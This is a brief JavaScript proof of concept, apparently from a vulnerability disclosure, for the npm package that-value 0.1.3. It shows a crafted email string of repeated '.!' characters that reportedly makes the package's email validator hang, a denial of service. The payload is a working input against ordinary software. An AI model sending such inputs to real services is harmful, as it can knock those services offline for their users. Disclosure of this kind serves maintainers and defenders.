/**
 * that-value@0.1.3
 * Package Manager: npm
 * Link to published package: https://github.com/q-nick/that-value
 * Link to GitHub repo: https://github.com/q-nick/that-value
 * Severity level: High
 * Module Description: Multi language/platform pack of validators (front-end and back-end)
 * Additional Info: It allows cause a denial of service when validating crafted invalid emails.
 * Contacted maintainer?: No
 * Open issue?: No
 */

var thatValue = require("that-value")
var emailValue = thatValue('00.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!!').is.string().is.email().and.contains('paul');

if(emailValue.valid())
{
    /* when valid */
}
else
{
  /*not valid*/
   var errorList = emailValue.getErrors();
}